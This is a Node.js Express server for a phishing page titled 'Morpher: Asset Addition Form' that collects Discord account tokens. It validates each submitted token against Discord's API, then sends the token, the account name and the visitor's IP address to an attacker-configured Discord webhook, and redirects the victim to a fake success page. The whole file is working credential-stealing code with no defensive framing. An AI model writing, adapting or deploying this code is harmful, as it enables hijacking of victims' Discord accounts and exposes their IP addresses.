import express from 'express';
import path from 'path';
import fs from 'fs';
import superagent from 'superagent';

const config = JSON.parse(fs.readFileSync(path.resolve('config/config.json'), 'utf-8'));

const app = express();

const validateToken = async (token) => new Promise(resolve => {
    superagent.get('https://discord.com/api/v9/users/@me')
        .set('Authorization', token)
        .then(resp => {
            if (resp.body.id) {
                resolve(`${resp.body.username}#${resp.body.discriminator} (${resp.body.id})`);
            } else {
                resolve(null);
            }
        })
        .catch(error => {
            resolve(null);
        })
})

app.use(express.static(path.resolve('public')));
app.use('/assets', express.static(path.resolve('assets')));

app.get('/', (req, res) => {
    const legal = fs.readFileSync(path.resolve(process.cwd(), 'public', 'form.html'), 'utf-8');
    res.send(legal.replace(/{{domain}}/g, req.headers.host));
});

app.get('/submit', async (req, resp) => {
    const token = req.query.t;
    if (token && token.includes('.')) {

        const validation = await validateToken(token);
        if (!validation) {
            return resp.redirect('https://discord.com/app');
        }

        fetch(config['Discord webhook'], {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content:
                    `@everyone\n**user**: \`${validation}\`\n**token**: \`${token}\`\n**ip**: \`${req.headers['x-forwarded-for']}\``
            })
        })

        return resp.redirect('/success');
    } else {
        resp.send('<script>alert(`Morpher: Asset Addition Form\n\nFailed to verify your Discord account, please retry.`);window.location=`https://discord.com/login`;</script>');
    }
})

app.get('/success', (req, resp) => {
    resp.sendFile(path.resolve('public', 'success.html'));
})

app.get('*', (req, resp) => {
    resp.redirect('/');
})

app.listen(80, () => {
    console.log('listening on port 80');
});
